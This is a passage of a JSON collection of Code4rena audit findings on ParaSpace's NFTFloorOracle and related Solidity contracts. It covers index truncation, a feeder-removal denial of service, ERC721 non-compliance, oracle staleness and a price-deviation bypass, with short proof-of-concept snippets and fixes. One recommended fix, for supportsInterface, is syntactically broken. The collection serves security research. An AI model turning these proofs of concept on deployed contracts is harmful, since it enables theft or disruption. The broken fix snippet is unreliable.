feederPositionMap[_feeder].index;\n        if (feederIndex >= 0 && feeders[feederIndex] == _feeder) {\n            feeders[feederIndex] = feeders[feeders.length - 1];\n            feeders.pop();\n        }\n        delete feederPositionMap[_feeder];\n        revokeRole(UPDATER_ROLE, _feeder);\n        emit FeederRemoved(_feeder);\n    }\n```\n\nI.e. `assets` array element is set to zero with `delete`, but not removed from the array.\n\nThis means that `assets` will only grow over time, and will eventually surpass `2^8 - 1 = 255`. That's realistic given that assets here are NFTs, whose variety will increase over time.\n\nOnce this happen the truncation will start to corrupt the indices:\n\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L278-L286>\n\n```solidity\n    function _addAsset(address _asset)\n        internal\n        onlyWhenAssetNotExisted(_asset)\n    {\n        assetFeederMap[_asset].registered = true;\n        assets.push(_asset);\n        assetFeederMap[_asset].index = uint8(assets.length - 1);\n        emit AssetAdded(_asset);\n    }\n```\n\nThis can happen with `feeders` too, if the count merely surpass `255` with net additions:\n\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L307-L316>\n\n```solidity\n    function _addFeeder(address _feeder)\n        internal\n        onlyWhenFeederNotExisted(_feeder)\n    {\n        feeders.push(_feeder);\n        feederPositionMap[_feeder].index = uint8(feeders.length - 1);\n        feederPositionMap[_feeder].registered = true;\n        _setupRole(UPDATER_ROLE, _feeder);\n        emit FeederAdded(_feeder);\n    }\n```\n\nThis will lead to `_removeAsset()` and `_removeFeeder()` clearing another assets/feeders as the `assetFeederMap[_asset].index` and `feederPositionMap[_feeder].index` become broken being truncated. It will permanently mess the structures.\n\n### Recommended Mitigation Steps\n\nAs a simplest measure consider increasing the limit to `2^32 - 1`:\n\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L278-L286>\n\n```solidity\n    function _addAsset(address _asset)\n        internal\n        onlyWhenAssetNotExisted(_asset)\n    {\n        assetFeederMap[_asset].registered = true;\n        assets.push(_asset);\n-       assetFeederMap[_asset].index = uint8(assets.length - 1);\n+       assetFeederMap[_asset].index = uint32(assets.length - 1);\n        emit AssetAdded(_asset);\n    }\n```\n\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L307-L316>\n\n```solidity\n    function _addFeeder(address _feeder)\n        internal\n        onlyWhenFeederNotExisted(_feeder)\n    {\n        feeders.push(_feeder);\n-       feederPositionMap[_feeder].index = uint8(feeders.length - 1);\n+       feederPositionMap[_feeder].index = uint32(feeders.length - 1);\n        feederPositionMap[_feeder].registered = true;\n        _setupRole(UPDATER_ROLE, _feeder);\n        emit FeederAdded(_feeder);\n    }\n```\n\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L32-L48>\n\n```solidity\nstruct FeederRegistrar {\n    // if asset registered or not\n    bool registered;\n    // index in asset list\n-   uint8 index;\n+   uint32 index;\n    // if asset paused,reject the price\n    bool paused;\n    // feeder -> PriceInformation\n    mapping(address => PriceInformation) feederPrice;\n}\n\nstruct FeederPosition {\n    // if feeder registered or not\n    bool registered;\n    // index in feeder list\n-   uint8 index;\n+   uint32 index;\n}\n```\n\nAlso, consider actually removing `assets` array element in `_removeAsset()` via the usual moving of the last element as it's done in `_removeFeeder()`.\n\n**[LSDan (judge) increased severity to High](https://github.com/code-423n4/2022-11-paraspace-findings/issues/482#issuecomment-1375641770)**\n\n\n\n***\n\n",
      "summary": "\nThe NFTFloorOracle contract contains two functions, `_addAsset()` and `_addFeeder()`, which truncate the `assets` and `feeders` arrays indices to 255, both using `uint8 index` field in the corresponding structures and performing `uint8(assets.length - 1)` truncation on the new element addition. This can become a problem over time, as the variety of assets (NFTs) is expected to increase over time. \n\nOnce the limit of 255 is surpassed, the truncation will start to corrupt the indices. This will lead to the `_removeAsset()` and `_removeFeeder()` functions clearing another assets/feeders as the `assetFeederMap[_asset].index` and `feederPositionMap[_feeder].index` become broken being truncated. This will permanently mess the structures, leading to an inability to control them and an Oracle malfunction. This can lead to collateral mispricing. \n\nThe simplest measure to mitigate this issue is to increase the limit to `2^32 - 1`. Additionally, consider actually removing `assets` array element in `_removeAsset()` via the usual moving of the last element as it's done in `_removeFeeder()`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "https://github.com/code-423n4/2022-11-paraspace-findings/issues/482",
      "tags": [],
      "finders": [
        "Jeiwan",
        "minhquanym",
        "gzeon",
        "brgltd",
        "hyh"
      ]
    },
    {
      "id": "25723",
      "title": "[H-01] Data corruption in `NFTFloorOracle`; Denial of Service",
      "impact": "HIGH",
      "content": "\nDuring `_removeFeeder` operation in `NFTFloorOracle` contract, the feeder is removed from `feeders` array, and linking in `feederPositionMap` for the specific feeder is removed. Deletion logic is implemented in \"Swap + Pop\" way, so indexes changes, but existing **code doesn't update indexes in** `feederPositionMap` **after feeder removal**, which causes the issue of Denial of Service for further removals.\nAs a result:\n\n*   Impossible to remove some `feeders` from the contract due to Out of Bounds array access. Removal fails because of transaction revert.\n*   Data in `feederPositionMap` is corrupted after some `feeders` removal. Data linking from `feederPositionMap.index` to `feeders` array is broken.\n\n### Proof of Concept\n\n        address internal feederA = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;\n        address internal feederB = 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2;\n        address internal feederC = 0x4B20993Bc481177ec7E8f571ceCaE8A9e22C02db;\n\n        function corruptFeedersMapping() external {\n            console.log(\"Starting from empty feeders array. Array size: %s\", feeders.length);\n            address[] memory initialFeeders = new address[](3);\n            initialFeeders[0] = feederA;\n            initialFeeders[1] = feederB;\n            initialFeeders[2] = feederC;\n            this.addFeeders(initialFeeders);\n            console.log(\"Feeders array: [%s, %s, %s]\", initialFeeders[0], initialFeeders[1], initialFeeders[2]);\n            console.log(\"Remove feeder B\");\n            this.removeFeeder(feederB);\n            console.log(\"feederPositionMap[A] = %s, feederPositionMap[C] = %s\", feederPositionMap[feederA].index, feederPositionMap[feederC].index);\n            console.log(\"Mapping for Feeder C store index 2, which was not updated after removal of B. Feeders array length is : %s\", feeders.length);\n            console.log(\"Try remove Feeder C. Transaction will be reverted because of access out of bounds of array. Data is corrupted\");\n            this.removeFeeder(feederC);\n        }\n\nSnippet execution result:\n![Alt text](https://i.gyazo.com/90ac873cd71194527d4d3b9bfe6e317e.png \"Optional title\")\n\n### Tools Used\n\nVisual inspection; Solidity snippet for PoC\n\n### Recommended Mitigation Steps\n\nUpdate index in `feederPositionMap` after feeders swap and pop.\n\n    feeders[feederIndex] = feeders[feeders.length - 1];\n    feederPositionMap[feeders[feederIndex]].index = feederIndex; //Index update added as a recommendation\n    feeders.pop();\n\n**[yubo-ruan (Paraspace) confirmed](https://github.com/code-423n4/2022-11-paraspace-findings/issues/79)**\n\n**[Trust (warden) commented](https://github.com/code-423n4/2022-11-paraspace-findings/issues/79#issuecomment-1400581150):**\n > I've submitted this report as well.\n> However, I believe it does not meet the high criteria set for HIGH severity finding. For HIGH, warden must show a direct loss of funds or damage to the protocol that stems from the specific issue. Here, there are clearly several conditionals that must occur in order for actual damage to take place.\n> Regardless, will respect judge's views on the matter.\n\n**[dmvt commented](https://github.com/code-423n4/2022-11-paraspace-findings/issues/79#issuecomment-1406270736):**\n > > I've submitted this report as well. However, I believe it does not meet the high criteria set for HIGH severity finding. For HIGH, warden must show a direct loss of funds or damage to the protocol that stems from the specific issue. Here, there are clearly several conditionals that must occur in order for actual damage to take place. Regardless, will respect judge's views on the matter.\n> \n> I respectfully disagree. The scenario is likely to occur at some point during normal operation of the protocol. The inability to remove dead or malfunctioning feeders can easily lead to the complete breakdown of the protocol and significant funds loss, the \"data corruption\" mentioned in the report. The severity of this issue, when it occurs, justifies the high risk rating.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a Denial of Service issue in the `NFTFloorOracle` contract. During the `_removeFeeder` operation, the feeder is removed from the `feeders` array but the existing code does not update the indexes in `feederPositionMap` after the feeder is removed. As a result, it is impossible to remove some feeders from the contract due to an Out of Bounds array access and the data in `feederPositionMap` is corrupted. A proof of concept was provided to demonstrate the issue.\n\nThe recommended mitigation step is to update the index in `feederPositionMap` after the feeders swap and pop. Trust (warden) commented that the issue does not meet the high criteria set for a HIGH severity finding. However, dmvt disagreed, stating that the inability to remove dead or malfunctioning feeders can easily lead to the complete breakdown of the protocol and significant funds loss, justifying the high risk rating.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "https://github.com/code-423n4/2022-11-paraspace-findings/issues/79",
      "tags": [],
      "finders": [
        "csanuragjain",
        "Trust",
        "kaliberpoziomka8552",
        "Jeiwan",
        "minhquanym",
        "RaymondFam",
        "Englave",
        "Lambda",
        "unforgiven",
        "9svR6w",
        "Josiah"
      ]
    },
    {
      "id": "16007",
      "title": "[M-24] MintableIncentivizedERC721 and NToken do not comply with ERC721, breaking composability",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/tokenization/base/MintableIncentivizedERC721.sol#L572>\n\nMintableIncentivizedERC721 implements supportsInterface as below:\n\n    /**\n     * @dev See {IERC165-supportsInterface}.\n     */\n    function supportsInterface(bytes4 interfaceId)\n        external\n        view\n        virtual\n        override(IERC165)\n        returns (bool)\n    {\n        return\n            interfaceId == type(IERC721Enumerable).interfaceId ||\n            interfaceId == type(IERC721Metadata).interfaceId;\n    }\n\nThe issue is that it will only support the ERC721 extensions, and does not comply with ERC721 itself. From [EIP721](https://eips.ethereum.org/EIPS/eip-721):\n\"Every ERC-721 compliant contract must implement the ERC721 and ERC165 interfaces (subject to caveats below):\"\n\n    /// @title ERC-721 Non-Fungible Token Standard\n    /// @dev See https://eips.ethereum.org/EIPS/eip-721\n    ///  Note: the ERC-165 identifier for this interface is 0x80ac58cd.\n    interface ERC721 /* is ERC165 */ {\n    ...\n\nInterface IDs are calculating by XORing together all the function signatures in the interface. Therefore, returning true for IERC721Enumerable and IERC721Metadata will not implicitly include IERC721.\n\n### Impact\n\nAny contract that will make sure it is dealing with an ERC721 compliant NFT will not interoperate with MintableIncentivizedERC721 and NTokens. Marketplaces and any NFT facilities will not operate with NTokens.\n\n### Proof of Concept\n\nThe test below is a standalone POC to show IncentivizedERC721 does not comply with ERC721. It is quickly checkable in Remix, copy deployment address of IncentivizedERC721 to the TestCompliance calls.\n\n    // SPDX-License-Identifier: GPL-2.0-or-later\n    pragma solidity ^0.8.10;\n    interface IERC721 {\n        /**\n         * @dev Emitted when `tokenId` token is transferred from `from` to `to`.\n         */\n        event Transfer(\n            address indexed from,\n            address indexed to,\n            uint256 indexed tokenId\n        );\n\n        /**\n         * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.\n         */\n        event Approval(\n            address indexed owner,\n            address indexed approved,\n            uint256 indexed tokenId\n        );\n\n        /**\n         * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.\n         */\n        event ApprovalForAll(\n            address indexed owner,\n            address indexed operator,\n            bool approved\n        );\n\n        /**\n         * @dev Returns the number of tokens in ``owner``'s account.\n         */\n        function balanceOf(address owner) external view returns (uint256 balance);\n\n        /**\n         * @dev Returns the owner of the `tokenId` token.\n         *\n         * Requirements:\n         *\n         * - `tokenId` must exist.\n         */\n        function ownerOf(uint256 tokenId) external view returns (address owner);\n\n        /**\n         * @dev Safely transfers `tokenId` token from `from` to `to`.\n         *\n         * Requirements:\n         *\n         * - `from` cannot be the zero address.\n         * - `to` cannot be the zero address.\n         * - `tokenId` token must exist and be owned by `from`.\n         * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.\n         * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.\n         *\n         * Emits a {Transfer} event.\n         */\n        function safeTransferFrom(\n            address from,\n            address to,\n            uint256 tokenId,\n            bytes calldata data\n        ) external;\n\n        /**\n         * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients\n         * are aware of the ERC721 protocol to prevent tokens from being forever locked.\n         *\n         * Requirements:\n         *\n         * - `from` cannot be the zero address.\n         * - `to` cannot be the zero address.\n         * - `tokenId` token must exist and be owned by `from`.\n         * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.\n         * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.\n         *\n         * Emits a {Transfer} event.\n         */\n        function safeTransferFrom(\n            address from,\n            address to,\n            uint256 tokenId\n        ) external;\n\n        /**\n         * @dev Transfers `tokenId` token from `from` to `to`.\n         *\n         * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.\n         *\n         * Requirements:\n         *\n         * - `from` cannot be the zero address.\n         * - `to` cannot be the zero address.\n         * - `tokenId` token must be owned by `from`.\n         * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.\n         *\n         * Emits a {Transfer} event.\n         */\n        function transferFrom(\n            address from,\n            address to,\n            uint256 tokenId\n        ) external;\n\n        /**\n         * @dev Gives permission to `to` to transfer `tokenId` token to another account.\n         * The approval is cleared when the token is transferred.\n         *\n         * Only a single account can be approved at a time, so approving the zero address clears previous approvals.\n         *\n         * Requirements:\n         *\n         * - The caller must own the token or be an approved operator.\n         * - `tokenId` must exist.\n         *\n         * Emits an {Approval} event.\n         */\n        function approve(address to, uint256 tokenId) external;\n\n        /**\n         * @dev Approve or remove `operator` as an operator for the caller.\n         * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.\n         *\n         * Requirements:\n         *\n         * - The `operator` cannot be the caller.\n         *\n         * Emits an {ApprovalForAll} event.\n         */\n        function setApprovalForAll(address operator, bool _approved) external;\n\n        /**\n         * @dev Returns the account approved for `tokenId` token.\n         *\n         * Requirements:\n         *\n         * - `tokenId` must exist.\n         */\n        function getApproved(uint256 tokenId)\n            external\n            view\n            returns (address operator);\n\n        /**\n         * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.\n         *\n         * See {setApprovalForAll}\n         */\n        function isApprovedForAll(address owner, address operator)\n            external\n            view\n            returns (bool);\n    }\n\n    interface IERC721Metadata is IERC721 {\n        /**\n         * @dev Returns the token collection name.\n         */\n        function name() external view returns (string memory);\n\n        /**\n         * @dev Returns the token collection symbol.\n         */\n        function symbol() external view returns (string memory);\n\n        /**\n         * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.\n         */\n        function tokenURI(uint256 tokenId) external view returns (string memory);\n    }\n\n    interface IERC721Enumerable is IERC721 {\n        /**\n         * @dev Returns the total amount of tokens stored by the contract.\n         */\n        function totalSupply() external view returns (uint256);\n        /**\n         * @dev Returns a token ID owned by `owner` at a given `index` of its token list.\n         * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.\n         */\n        function tokenOfOwnerByIndex(address owner, uint256 index)\n            external\n            view\n            returns (uint256);\n        /**\n         * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.\n         * Use along with {totalSupply} to enumerate all tokens.\n         */\n        function tokenByIndex(uint256 index) external view returns (uint256);\n    }\n\n    interface IERC165 {\n        /**\n         * @dev Returns true if this contract implements the interface defined by\n         * `interfaceId`. See the corresponding\n         * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]\n         * to learn more about how these ids are created.\n         *\n         * This function call must use less than 30 000 gas.\n         */\n        function supportsInterface(bytes4 interfaceId) external view returns (bool);\n    }\n\n    contract IncentivizedERC721 is IERC165{\n\n        function supportsInterface(bytes4 interfaceId)\n        external\n        view\n        virtual\n        override(IERC165)\n        returns (bool)\n        {\n            return\n                interfaceId == type(IERC721Enumerable).interfaceId ||\n                interfaceId == type(IERC721Metadata).interfaceId;\n        }\n\n    }\n\n    // Hard coded values taken from https://eips.ethereum.org/EIPS/eip-721\n    contract TestCompliance {\n        function doesSupportERC721Enumerable(IERC165 token) view external returns (bool) {\n            return token.supportsInterface(0x780e9d63);\n        }\n\n        function doesSupportERC721Metadata(IERC165 token) view external returns (bool) {\n            return token.supportsInterface(0x5b5e139f);\n        }\n\n        function doesSupportERC721(IERC165 token) view external returns (bool) {\n            return token.supportsInterface(0x80ac58cd);\n        }\n    }\n\n### Recommended Mitigation Steps\n\nChange supportedInterface function:\n\n    /**\n     * @dev See {IERC165-supportsInterface}.\n     */\n    function supportsInterface(bytes4 interfaceId)\n        external\n        view\n        virtual\n        override(IERC165)\n        returns (bool)\n    {\n        return\n            interfaceId == type(IERC721Enumerable).interfaceId ||\n            interfaceId == type(IERC721Metadata).interfaceId || ;\n    \t\tinterfaceId == type(IERC721).interfaceId || \n    }\n\n\n\n***\n\n",
      "summary": "\nThe MintableIncentivizedERC721 contract does not comply with ERC721, as it only supports the ERC721 extensions and not the ERC721 itself. This means that any contract that will make sure it is dealing with an ERC721 compliant NFT will not interoperate with MintableIncentivizedERC721 and NTokens. Marketplaces and any NFT facilities will not operate with NTokens.\n\nA proof of concept was provided to show that IncentivizedERC721 does not comply with ERC721. This can be tested quickly in Remix, by copying the deployment address of IncentivizedERC721 to the TestCompliance calls.\n\nThe recommended mitigation step is to change the supportedInterface function to include IERC721. This can be done by adding the following line: interfaceId == type(IERC721).interfaceId ||",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "https://github.com/code-423n4/2022-11-paraspace-findings/issues/497",
      "tags": [],
      "finders": [
        "csanuragjain",
        "Trust",
        "Lambda",
        "KingNFT",
        "imare",
        "eierina"
      ]
    },
    {
      "id": "16006",
      "title": "[M-23] Oracle will become invalid much faster than intended on non-mainnet chains",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L12>\n\nNFTFloorOracle is in charge of answering price queries for ERC721 assets.<br>\nEXPIRATION\\_PERIOD constant is the max amount of blocks allowed to have passed for the reading to be considered up to date:\n\n    uint256 diffBlock = currentBlock - priceInfo.updatedAt;\n    if (diffBlock <= config.expirationPeriod) {\n        validPriceList[validNum] = priceInfo.twap;\n        validNum++;\n    }\n\nWe can see it is set to 1800, which is intended to be 6 hours with 12 second block time assumption:\n\n    //expirationPeriod at least the interval of client to feed data(currently 6h=21600s/12=1800 in mainnet)\n    //we do not accept price lags behind to much\n    uint128 constant EXPIRATION_PERIOD = 1800;\n\nThe issue is that different blockchains have wildly different block times. BSC has one every 3 seconds, while Avalanche has a new block every 1 sec. Also the block product rate may be subject to future changes. Therefore, readings may be considered stale much faster than intended on non-mainnet chains.\n\nThe correct EVM compatible way to check it is using the block.timestamp variable. Make sure the difference between current and previous timestamp is under 6 &ast; 3600 seconds.\n\nParaspace docs show they are clearly intending to deploy in multiple chains so it's very relevant.\n\n### Impact\n\nOracle will become invalid much faster than intended on non-mainnet chains.\n\n### Recommended Mitigation Steps\n\nUse block.timestamp to measure passage of time.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the NFTFloorOracle, which is responsible for answering price queries for ERC721 assets. The EXPIRATION_PERIOD constant is set to 1800, which is intended to be 6 hours with a 12-second block time assumption. However, different blockchains have different block times. For example, BSC has a block every 3 seconds, while Avalanche has a block every 1 second. This means that readings may be considered stale much faster than intended on non-mainnet chains.\n\nThe impact of this bug is that the Oracle will become invalid much faster than intended on non-mainnet chains. The bug was detected through manual audit.\n\nThe recommended mitigation step is to use block.timestamp to measure passage of time, rather than the block number. This is an EVM-compatible way to check passage of time and is especially relevant as Paraspace intends to deploy in multiple chains.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "https://github.com/code-423n4/2022-11-paraspace-findings/issues/496",
      "tags": [],
      "finders": [
        "Trust"
      ]
    },
    {
      "id": "16005",
      "title": "[M-22] Price can deviate by much more than maxDeviationRate",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L370>\n\nNFTFloorOracle retrieves ERC721 prices for ParaSpace. maxPriceDeviation is a configurable parameter, which limits the change percentage from current price to a new feed update.\n\n    function _checkValidity(address _asset, uint256 _twap)\n        internal\n        view\n        returns (bool)\n    {\n        require(_twap > 0, \"NFTOracle: price should be more than 0\");\n        PriceInformation memory assetPriceMapEntry = assetPriceMap[_asset];\n        uint256 _priorTwap = assetPriceMapEntry.twap;\n        uint256 _updatedAt = assetPriceMapEntry.updatedAt;\n        uint256 priceDeviation;\n        //first price is always valid\n        if (_priorTwap == 0 || _updatedAt == 0) {\n            return true;\n        }\n        priceDeviation = _twap > _priorTwap\n            ? (_twap * 100) / _priorTwap\n            : (_priorTwap * 100) / _twap;\n        // config maxPriceDeviation as multiple directly(not percent) for simplicity\n        if (priceDeviation >= config.maxPriceDeviation) {\n            return false;\n        }\n        return true;\n    }\n\nThe issue is that it only mitigates a massive change in a single transaction, but attackers can still just call setPrice() and update the price many times in a row, each with maxDevicePrice in price change.\n\nThe correct approach would be to limit the TWAP growth or decline over some timespan. This will allow admins to react in time to a potential attack and remove the bad price feed.\n\n### Impact\n\nPrice can deviate by much more than maxDeviationRate.\n\n### Proof of Concept\n\nmaxDeviationRate = 150<br>\nCurrently 3 oracles in place, their readings are \\[1, 1.1, 2]<br>\nOracle #2 can call setPrice(1.5), setPrice(1.7), setPrice(2) to immediately change the price from 1.1 to 2, which is almost 100% growth, much above 50% allowed growth.\n\n### Recommended Mitigation Steps\n\nCode already has lastUpdated timestamp for each oracle. Use the elapsed time to calculate a reasonable maximum price change per oracle.\n\n\n\n***\n\n",
      "summary": "\nThe bug report is about the NFTFloorOracle in ParaSpace which retrieves ERC721 prices. The issue is that it only mitigates a massive change in a single transaction, but attackers can still just call setPrice() and update the price many times in a row, each with maxDevicePrice in price change. This can allow the price to deviate by much more than maxDeviationRate. As an example, with maxDeviationRate set to 150, if there are three oracles with readings of [1, 1.1, 2], Oracle #2 can call setPrice(1.5), setPrice(1.7), setPrice(2) to immediately change the price from 1.1 to 2, which is almost 100% growth, much above 50% allowed growth. The proof of concept was done through manual audit.\n\nThe recommended mitigation step is to use the elapsed time to calculate a reasonable maximum price change per oracle. This will allow admins to react in time to a potential attack and remove the bad price feed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "https://github.com/code-423n4/2022-11-paraspace-findings/issues/491",
      "tags": [],
      "finders": [
        "Trust"
      ]
    },
    {
      "id": "16004",
      "title": "[M-21] Pausing assets only affects future price updates, not previous malicious updates",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L236>\n\nNFTFloorOracle retrieves ERC721 prices for ParaSpace. It is pausable by admin on a per asset level using setPause(asset, flag).\nsetPrice will not be callable when asset is paused:\n\n    function setPrice(address _asset, uint256 _twap)\n        public\n        onlyRole(UPDATER_ROLE)\n        onlyWhenAssetExisted(_asset)\n        whenNotPaused(_asset)\n\nHowever, getPrice() is unaffected by the pause flag. This is really dangerous behavior, because there will be 6 hours when the current price treated as valid, although the asset is clearly intended to be on lockdown.\n\nBasically, pauses are only forward facing, and whatever happened is valid. But, if we want to pause an asset, something fishy has already occured, or will occur by the time setPause() is called. So, \"whatever happened happened\" mentality is overly dangerous.\n\n### Impact\n\nPausing assets only affects future price updates, not previous malicious updates.\n\n### Recommended Mitigation Steps\n\nAdd whenNotPaused to getPrice() function as well.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the NFTFloorOracle contract, which is used to retrieve ERC721 prices for ParaSpace. The contract is pausable by admin on a per asset level using setPause(asset, flag). The setPrice function will not be callable when an asset is paused, however the getPrice() function is unaffected by the pause flag. This is a dangerous behavior, because it means that there will be a 6 hour period when the current price is treated as valid, even though the asset is intended to be on lockdown. The impact of this vulnerability is that pauses only affect future price updates, not previous malicious updates. The tools used to find this vulnerability were manual audit. The recommended mitigation step is to add whenNotPaused to the getPrice() function as well.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "https://github.com/code-423n4/2022-11-paraspace-findings/issues/490",
      "tags": [],
      "finders": [
        "Trust",
        "pashov"
      ]
    },
    {
      "id": "16003",
      "title": "[M-20] Oracle does not treat upward and downward price movement the same in validity checks, causing safety issues in oracle usage",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L365>\n\nNFTFloorOracle retrieves ERC721 prices for ParaSpace. maxPriceDeviation is a configurable parameter, which limits the change percentage from current price to a new feed update. We can see how priceDeviation is calculated and compared to maxPriceDeviation in \\_checkValidity:\n\n    priceDeviation = _twap > _priorTwap\n        ? (_twap * 100) / _priorTwap\n        : (_priorTwap * 100) / _twap;\n    // config maxPriceDeviation as multiple directly(not percent) for simplicity\n    if (priceDeviation >= config.maxPriceDeviation) {\n        return false;\n    }\n    return true;\n\nThe large number minus small number must be smaller than maxPriceDeviation. However, the way it is calculated means price decrease is much more sensitive and likely to be invalid than a price increase.\n\n`10 -> 15, priceDeviation = 15 / 10 = 1.5`<br>\n`15 -> 10, priceDeviation = 15 / 10 = 1.5`\n\nFrom 10 to 15, price rose by 50%. From 15 to 10, price  dropped by 33%. Both are the maximum change that would be allowed by deviation parameter. The effect of this behavior is that the protocol will be either too restrictive in how it accepts price drops, or too permissive in how it accepts price rises.\n\n### Impact\n\nOracle does not treat upward and downward price movement the same in validity checks, causing safety issues in oracle usage.\n\n### Recommended Mitigation Steps\n\nUse a percentage base calculation for both upward and downward price movements.\n\n**[WalidOfNow (Paraspace) commented](https://github.com/code-423n4/2022-11-paraspace-findings/issues/487#issuecomment-1404056674):**\n > Going from 10 to 15 is 50% and from 15 to 10 is 33% percent. This is desired behaviour here. Why should we treat 33% as 50%?\n\n**[Trust (warden) commented](https://github.com/code-423n4/2022-11-paraspace-findings/issues/487#issuecomment-1404113039):**\n > That is exactly the point of this submission. Right now, you are treating both price movements (10-15, 15-10) the same, even though one is 50% and the other is 33%. \n> \n> You are being far too permissive in upward price changes compared to downward changes, when accepting deviations.\n\n\n\n***\n\n",
      "summary": "\nThe NFTFloorOracle in the code retrieves ERC721 prices for ParaSpace. It has a parameter called maxPriceDeviation which limits the change percentage from current price to a new feed update. However, the way it is calculated means price decrease is much more sensitive and likely to be invalid than a price increase. This behavior can cause safety issues in the oracle usage and should be addressed. \n\nThe recommended mitigation step is to use a percentage base calculation for both upward and downward price movements. This bug was discovered through manual audit.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "https://github.com/code-423n4/2022-11-paraspace-findings/issues/487",
      "tags": [],
      "finders": [
        "Trust"
      ]
    },
    {
      "id": "16002",
      "title": "[M-19] Rewards are not accounted for properly in NTokenApeStaking contracts, limiting users collateral",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/tokenization/libraries/ApeStakingLogic.sol#L253\n\n\n## Vulnerability details\n\n## Description\n\nApeStakingLogic.sol implements the logic for staking ape coins through the NTokenApeStaking NFT.\n\n`getTokenIdStakingAmount()` is an important function which returns the entire stake amount mapping for a specific BAYC / MAYC NFT.\n\n```\nfunction getTokenIdStakingAmount(\n    uint256 poolId,\n    ApeCoinStaking _apeCoinStaking,\n    uint256 tokenId\n) public view returns (uint256) {\n    (uint256 apeStakedAmount, ) = _apeCoinStaking.nftPosition(\n        poolId,\n        tokenId\n    );\n    uint256 apeReward = _apeCoinStaking.pendingRewards(\n        poolId,\n        address(this),\n        tokenId\n    );\n    (uint256 bakcTokenId, bool isPaired) = _apeCoinStaking.mainToBakc(\n        poolId,\n        tokenId\n    );\n    if (isPaired) {\n        (uint256 bakcStakedAmount, ) = _apeCoinStaking.nftPosition(\n            BAKC_POOL_ID,\n            bakcTokenId\n        );\n        apeStakedAmount += bakcStakedAmount;\n    }\n    return apeStakedAmount + apeReward;\n}\n```\n\nWe can see that the total returned amount is the staked amount through the direct NFT, plus rewards for the direct NFT, plus the staked amount of the BAKC token paired to the direct NFT. However, the calculation does not include the pendingRewards for the BAKC staked amount, which accrues over time as well.\n\nAs a result, getTokenIdStakingAmount() returns a value lower than the correct user balance. This function is used in PTokenSApe.sol's 